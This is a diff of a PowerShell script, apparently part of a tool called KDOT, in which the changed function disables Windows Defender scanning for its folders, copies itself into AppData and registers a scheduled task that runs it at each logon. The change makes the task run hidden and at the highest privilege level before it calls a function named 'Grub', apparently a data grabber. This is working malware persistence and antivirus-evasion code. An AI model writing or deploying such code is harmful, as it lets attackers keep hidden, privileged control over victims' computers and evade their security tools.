@@ -9,17 +9,16 @@ function TASKS {
         Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
         Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
         New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
-        $origin = $MyInvocation.MyCommand.Path
-        Copy-Item -Path "$origin" -Destination "$env:APPDATA\KDOT\KDOT.ps1"
+        $origin = $PSCommandPath
+        Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
     }
     $test = Get-ScheduledTask | Select-Object -ExpandProperty TaskName
     if ($test -contains "KDOT") {
         Write-Host "KDOT already exists"
     } else {
-        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:APPDATA\KDOT\KDOT.ps1"
-        $Trigger = New-ScheduledTaskTrigger -AtLogOn
-        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-        Register-ScheduledTask -TaskName "KDOT" -Action $Action -Trigger $Trigger -Settings $Settings
+        $schedule = New-ScheduledTaskTrigger -AtLogOn
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1"
+        Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest
     }
     Grub
 }
